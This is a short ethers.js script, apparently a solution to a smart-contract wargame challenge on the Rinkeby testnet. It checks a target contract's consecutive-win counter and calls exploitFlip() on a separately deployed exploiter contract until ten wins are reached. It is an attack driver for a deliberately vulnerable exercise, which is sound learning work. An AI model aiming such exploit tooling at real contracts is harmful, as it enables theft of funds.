const ethers = require('ethers')

const target = '0xa63375092861FF43977506e7D0928f666c233Fb4'
const exploiter = '0x8063a8D75143dEDDe37d53D8C8929e3Ec8DFc42e'

const targetAbi = ['function consecutiveWins() view returns (uint256 wins)']
const exploiterAbi = ['function exploitFlip() public']

const main = async () => {
  const provider = await new ethers.providers.JsonRpcProvider(
    process.env.RINKEBY_RPC,
  )

  const signer = new ethers.Wallet(process.env.DEPLOYER_PK, provider)

  const targetContract = await new ethers.Contract(target, targetAbi, provider)
  const exploiterContract = await new ethers.Contract(
    exploiter,
    exploiterAbi,
    signer,
  )

  const wins = await targetContract.consecutiveWins()

  console.log(`Current wins: ${wins}`)

  if (wins >= 10) {
    console.log('You won.')
  } else {
    const tx = await exploiterContract.exploitFlip()
    await tx.wait()
  }
}

main()
